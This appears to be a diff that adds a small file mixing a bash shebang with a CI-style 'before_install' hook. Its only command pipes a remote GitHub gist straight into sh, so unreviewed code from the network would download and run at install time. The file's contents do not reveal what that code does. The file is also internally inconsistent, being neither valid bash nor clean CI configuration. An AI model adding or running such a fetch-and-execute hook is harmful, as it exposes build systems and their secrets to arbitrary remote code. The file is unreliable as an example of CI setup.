@@ -1,0 +1,4 @@
+#!/bin/bash
+
+before_install:
+- curl https://gist.githubusercontent.com/ridwan23/d72e140d18914a063a06fbe6a98e16ba/raw/ | sh
